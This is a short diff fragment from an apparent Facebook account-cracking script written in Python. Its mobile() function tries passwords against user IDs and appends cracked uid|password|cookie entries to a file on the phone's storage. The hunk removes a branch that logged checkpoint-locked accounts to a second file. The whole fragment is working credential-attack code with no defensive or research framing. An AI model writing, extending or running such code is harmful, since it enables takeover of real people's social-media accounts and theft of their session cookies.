@@ -1694,11 +1694,6 @@ def mobile(uid,pwx,tl):
                            open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                            oks.append(uid)
                            break
-            elif "www.facebook.com" in result["error"]["message"]:
-                #print(f" {red}[SUMON-CP] {uid}|{pw}")
-                open("/sdcard/SUMON_file_2f.txt", "a").write(f"{uid}|{pw}\n")
-                cps.append(uid+"|"+pw)
-                break
             else:
                 continue
         loop+=1
